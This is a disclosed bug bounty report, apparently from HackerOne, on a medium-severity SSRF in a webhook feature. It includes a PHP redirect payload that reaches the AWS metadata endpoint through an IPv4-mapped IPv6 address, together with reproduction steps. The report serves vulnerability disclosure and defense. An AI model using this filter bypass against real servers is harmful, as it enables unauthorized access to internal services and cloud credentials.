# Server Side Request Forgery (SSRF) in webhook functionality

## Report Details
- **Report ID**: 2301565
- **URL**: https://hackerone.com/reports/2301565
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-01-02T07:22:06.195Z
- **Disclosed**: 2024-01-30T12:46:16.459Z

## Reporter
- **Username**: madara_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

- SSRF stands for "Server-Side Request Forgery" in English. It refers to a security vulnerability where an attacker can manipulate a web application to make HTTP requests from the server side instead of the client side. This can allow the attacker to access internal and sensitive resources that are not normally accessible.
- In an SSRF attack, the attacker can manipulate the requests made by an application to target internal resources such as local files, internal services, or even systems on the internal network. This can lead to the disclosure of sensitive information or unauthorized actions being performed on the server.
- In this case I was able to bypass the anti ssrf rules in the implemented webhook functionality, I noticed that there is no filter enabled for IPV6 IP addresses with IPv6 address mapped to IPv4.

**Description:**

### Steps To Reproduce
- To play this account you need to have an organizational account.
- Additionally, it is necessary to have a public server that interprets php, you can use 000webhost.com
1. Create a public PHP server and upload the following file h1.php:
```
<?php
// Obtén los datos de la solicitud
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
header("Content-Type: application/json");
header("Location: http://[::ffff:a9fe:a9fe]"); //IPV6 Compressed
?>
```
2. Save the public url where the php script is located
3. Log in to your hackerone account
4. Enter your organization's program settings
5. Look for the **webhooks** option.
6. Create a webhook with the previously copied url.
7. Once the webhook is created, edit it and click on the **Test request** button
9. You can see in the webhook logs that in response it launches the header  **server: EC2ws**  which corresponds to the Amazon metada instance.

## Impact

- "Server-Side Request Forgery" (SSRF) is a security vulnerability that can have various negative impacts. It occurs when an attacker tricks a server into making requests on their behalf. This can lead to unauthorized access to internal resources, such as databases or internal services, that are typically not accessible from the outside. Additionally, SSRF can be exploited for port scanning, potentially revealing vulnerable services. Attackers may use SSRF to force servers to perform unwanted actions on internal services, leading to data breaches or malicious activities. The vulnerability also poses a risk of bypassing network restrictions, allowing attackers to circumvent security measures. To mitigate SSRF, it is crucial to implement secure development practices, validate and filter user inputs effectively, and ensure that servers do not make unauthorized requests to internal resources. Utilizing whitelists for permitted addresses and disabling unnecessary DNS resolution are recommended measures to enhance security.

## Attachments
No attachments
